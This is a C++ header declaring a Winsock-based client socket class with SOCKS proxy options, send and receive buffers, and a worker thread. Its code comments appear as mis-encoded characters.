// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_
#include <winsock2.h>
#include <mswsock.h>
#include "Buffer.h"	// Added by ClassView
#include "Manager.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Change at your Own Peril
enum									// ����,�޴���, socks v4, socks v5
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};


class CClientSocket  
{
	friend class CManager;
public:
	CBuffer m_WriteBuffer;						// д����
	CBuffer	m_ResendWriteBuffer;				// �ش�д����
	CBuffer m_ReadBuffer;						// ������

	void Disconnect();										
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void run_event_loop();
	bool IsRunning();

	HANDLE m_hWorkerThread;						// �������߳̾��
	SOCKET m_Socket;							// ����������ӵ��׽���
	HANDLE m_hEvent;							// �¼�

	CClientSocket();
	virtual ~CClientSocket();
private:
	static DWORD WINAPI WorkThread(LPVOID lparam);						// �������߳�
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	bool m_bIsRunning;													//  �Ƿ���������
	CManager	*m_pManager;						

};



#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
